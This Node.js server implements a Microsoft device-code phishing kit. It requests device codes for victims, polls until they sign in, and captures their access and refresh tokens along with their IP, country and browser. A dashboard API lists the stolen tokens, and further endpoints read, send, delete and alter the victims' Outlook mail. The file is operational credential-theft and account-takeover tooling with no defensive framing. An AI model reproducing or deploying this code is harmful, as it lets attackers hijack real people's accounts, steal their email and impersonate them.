const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// ============================================
// YOUR WORKING CLIENT ID
// ============================================
const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
// ============================================

// Store sessions
let userSessions = new Map();
let pendingAuth = new Map();
let sessionCounter = 1;
let totalVisits = 0;

function getCountryFromIp(ip) {
    const countryMap = {
        '46.183': 'United States',
        '172.': 'United States',
        '104.': 'United States',
        '185.': 'Germany',
        '188.': 'United Kingdom',
        '45.': 'Canada',
        '103.': 'India',
        '31.': 'Netherlands',
        '46.': 'Sweden'
    };
    for (const [prefix, country] of Object.entries(countryMap)) {
        if (ip.startsWith(prefix)) return country;
    }
    return 'Other';
}

function generateSessionId() {
    return 'sid_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
}

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// ============================================
// START AUTHENTICATION - Basic scopes only (NO admin needed)
// ============================================
app.post('/start', async (req, res) => {
    try {
        const sessionId = generateSessionId();
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const country = getCountryFromIp(clientIp);
        
        totalVisits++;
        
        console.log(`[START] New auth request - Session: ${sessionId.substring(0, 15)}..., IP: ${clientIp}`);
        
        // Basic scopes only - NO Mail scopes (avoid admin consent)
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'openid profile email User.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in, interval } = response.data;
        
        console.log(`[START] Device code: ${user_code}, expires in ${expires_in}s`);
        
        pendingAuth.set(sessionId, {
            device_code,
            user_code,
            sessionId,
            status: 'pending',
            ip: clientIp,
            userAgent: userAgent,
            country: country,
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        pollForToken(device_code, sessionId);
        
        res.json({
            userCode: user_code,
            sessionId: sessionId,
            interval: interval || 5,
            expiresIn: expires_in
        });
        
    } catch (err) {
        console.error('[START] Error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

async function pollForToken(device_code, sessionId) {
    console.log(`[POLL] Started polling for session ${sessionId.substring(0, 15)}...`);
    
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(sessionId);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            console.log(`[POLL] Session ${sessionId.substring(0, 15)}... expired`);
            pending.status = 'expired';
            pendingAuth.delete(sessionId);
            clearInterval(pollInterval);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: YOUR_CLIENT_ID,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            
            console.log(`[POLL] ✅ Token received!`);
            console.log(`[POLL] PRT: ${tokens.refresh_token ? 'YES ✓' : 'NO'}`);
            
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const userEmail = userInfo.data.mail || userInfo.data.userPrincipalName;
            const userName = userInfo.data.displayName;
            
            console.log(`[POLL] User: ${userEmail}`);
            
            userSessions.set(userEmail, {
                sessionId: sessionId,
                email: userEmail,
                name: userName,
                ip: pending.ip,
                userAgent: pending.userAgent,
                country: pending.country,
                access_token: tokens.access_token,
                refresh_token: tokens.refresh_token,
                expires_in: tokens.expires_in,
                expires_at: Date.now() + (tokens.expires_in * 1000),
                capturedAt: new Date().toISOString(),
                hasPRT: !!tokens.refresh_token
            });
            
            pending.status = 'success';
            pending.email = userEmail;
            pendingAuth.delete(sessionId);
            clearInterval(pollInterval);
            
            console.log(`✅✅✅ PRT captured for ${userEmail}`);
            
        } catch (err) {}
    }, 3000);
}

app.get('/state', async (req, res) => {
    const sessionId = req.query.session_id;
    if (!sessionId) return res.json({ status: 'error' });
    
    const pending = pendingAuth.get(sessionId);
    if (pending) {
        if (pending.status === 'success') {
            return res.json({ status: 'success', email: pending.email });
        }
        return res.json({ status: 'pending' });
    }
    
    res.json({ status: 'pending' });
});

// ============================================
// REFRESH TOKEN - Basic scopes only
// ============================================
async function getFreshAccessToken(email) {
    const session = userSessions.get(email);
    if (!session || !session.refresh_token) return null;
    
    try {
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
            new URLSearchParams({
                grant_type: 'refresh_token',
                refresh_token: session.refresh_token,
                client_id: YOUR_CLIENT_ID,
                scope: 'openid profile email User.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        session.access_token = response.data.access_token;
        session.expires_at = Date.now() + (response.data.expires_in * 1000);
        
        return response.data.access_token;
    } catch (err) {
        return null;
    }
}

// ============================================
// API ENDPOINTS
// ============================================
app.get('/api/sessions', (req, res) => {
    const sessions = Array.from(userSessions.values()).map(s => ({
        id: s.sessionId,
        email: s.email,
        name: s.name,
        ip: s.ip,
        country: s.country,
        userAgent: s.userAgent,
        type: 'PRT Captured',
        capturedAt: s.capturedAt,
        hasPRT: s.hasPRT
    }));
    res.json({ sessions: sessions, total: sessions.length });
});

app.get('/api/session/token/:email', async (req, res) => {
    const { email } = req.params;
    const session = userSessions.get(email);
    if (!session) return res.status(404).json({ error: 'Session not found' });
    
    const freshToken = await getFreshAccessToken(email);
    
    res.json({
        email: session.email,
        access_token: freshToken || session.access_token,
        refresh_token: session.refresh_token,
        has_refresh_token: !!session.refresh_token
    });
});

app.get('/api/list_access_tokens', (req, res) => {
    const tokens = Array.from(userSessions.values()).map(s => ({
        id: s.sessionId,
        user: s.email,
        name: s.name,
        resource: 'Access Token',
        accesstoken: s.access_token,
        issued_at: s.capturedAt,
        expires_at: new Date(s.expires_at).toLocaleString()
    }));
    res.json(tokens);
});

app.get('/api/list_refresh_tokens', (req, res) => {
    const tokens = Array.from(userSessions.values())
        .filter(s => s.refresh_token)
        .map(s => ({
            id: s.sessionId,
            user: s.email,
            name: s.name,
            resource: 'PRT (Refresh Token)',
            refreshtoken: s.refresh_token
        }));
    res.json(tokens);
});

app.get('/api/country_stats', (req, res) => {
    const countryCount = {};
    for (const session of userSessions.values()) {
        const country = session.country || 'Other';
        countryCount[country] = (countryCount[country] || 0) + 1;
    }
    res.json({ countries: countryCount, total: userSessions.size });
});

app.get('/api/overview_stats', (req, res) => {
    res.json({
        totalVisits: totalVisits,
        totalSessions: userSessions.size,
        totalPRTs: Array.from(userSessions.values()).filter(s => s.refresh_token).length,
        totalCountries: new Set(Array.from(userSessions.values()).map(s => s.country)).size,
        lastCapture: userSessions.size > 0 ? new Date(Math.max(...Array.from(userSessions.values()).map(s => new Date(s.capturedAt).getTime()))).toLocaleString() : 'None'
    });
});

app.delete('/api/sessions/clear', (req, res) => {
    userSessions.clear();
    pendingAuth.clear();
    totalVisits = 0;
    res.json({ success: true });
});

// ============================================
// MAILBOX API - Using Outlook REST API (No admin consent needed!)
// ============================================
app.get('/api/mail/folders/:email', async (req, res) => {
    const { email } = req.params;
    const token = await getFreshAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        // Using Outlook REST API instead of Graph API
        const response = await axios.get('https://outlook.office.com/api/v2.0/me/folders', {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        res.json(response.data);
    } catch (err) {
        console.error('Folders error:', err.response?.data);
        res.status(500).json({ error: 'Failed to fetch folders' });
    }
});

app.get('/api/mail/:email/:folderId', async (req, res) => {
    const { email, folderId } = req.params;
    const token = await getFreshAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        const response = await axios.get(`https://outlook.office.com/api/v2.0/me/folders/${folderId}/messages`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$top': 50, '$orderby': 'ReceivedDateTime desc' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch emails' });
    }
});

app.get('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const token = await getFreshAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        const response = await axios.get(`https://outlook.office.com/api/v2.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch message' });
    }
});

app.post('/api/mail/send/:email', async (req, res) => {
    const { email } = req.params;
    const { to, subject, body } = req.body;
    const token = await getFreshAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        await axios.post('https://outlook.office.com/api/v2.0/me/sendmail', {
            Message: {
                Subject: subject,
                Body: { ContentType: 'HTML', Content: body },
                ToRecipients: to.map(addr => ({ EmailAddress: { Address: addr } }))
            }
        }, { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to send email' });
    }
});

app.delete('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const token = await getFreshAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        await axios.delete(`https://outlook.office.com/api/v2.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to delete message' });
    }
});

app.patch('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const { isRead } = req.body;
    const token = await getFreshAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        await axios.patch(`https://outlook.office.com/api/v2.0/me/messages/${messageId}`, 
            { IsRead: isRead },
            { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } }
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to update' });
    }
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ Using Outlook REST API - No admin consent needed!`);
    console.log(`========================================\n`);
});
